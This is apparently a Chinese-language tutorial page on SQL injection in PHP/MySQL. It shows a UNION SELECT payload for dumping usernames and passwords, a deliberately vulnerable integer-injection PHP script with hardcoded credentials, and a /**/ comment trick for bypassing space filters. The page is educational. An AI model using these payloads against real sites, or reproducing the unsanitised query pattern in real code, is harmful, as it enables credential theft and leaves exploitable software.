## 注入原理

在 php 中, 我们可以使用如下语句来操作一个 MySQL 数据库:

```php
$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
```

在 php 中, `.` 的语法表示字符串的拼接. 我们如果传入一个 1, 则会调用如下查询语句:

```php
$sql = "SELECT username,password FROM users WHERE id = 1";
```

假设程序没有做任何的过滤和限制, 则存在 SQL 注入漏洞. 比如我们可以在这个 1 后面, 写更多的 Sql 语句, 比如这样子:

```php
$_GET["id"] ="1 union select username,password from user"
```

则可以访问到所有的用户名和密码. 因为原本的语句已经变成了:

```php
$sql = "SELECT username,password FROM users WHERE id = 1 union select username,password from user;"
```

## 常见绕过方式

### 整型注入

参考源代码如下, 该段代码为经典的整型注入漏洞源码.

```php
<meta charset="utf-8">
<?php
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    $host = 'localhost';
    $user = 'admin';
    $pass = 'root';
    $conn = mysqli_connect($host, $user, $pass, 'test');
    if (!$conn) {
        die('连接失败:' . mysqli_error($conn));
    }
    mysqli_query($conn, "set names utf8"); //设置编码, 防止中文乱码

    $sql = "SELECT id,username from users where id=$id";
    $result = mysqli_query($conn, $sql);
    if (!$result) {
        die("无法取得数据: " . mysqli_error($conn));
    }

    echo '<h2>MYSql Test';
    echo '<table border="1"><tr><td>ID</td><td>Username</td></tr>';
    while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
        echo "<tr><td> {$row['id']}</td>".
            "<td>{$row['username']}</td>".
            "</tr>";
    }
    echo '</table>';
    mysqli_close($conn);
} else {
    echo '试试 ?id=1';
}
```

// TODO
### 空格过滤绕过

如果需要过滤空格, 可以使用注释 `/**/` 来绕过. 直接放在语句中间即可代表空格, 比如这样子的 payload:

```sql
SELECT/*替换空格*/password/**/FROM/**/Members
```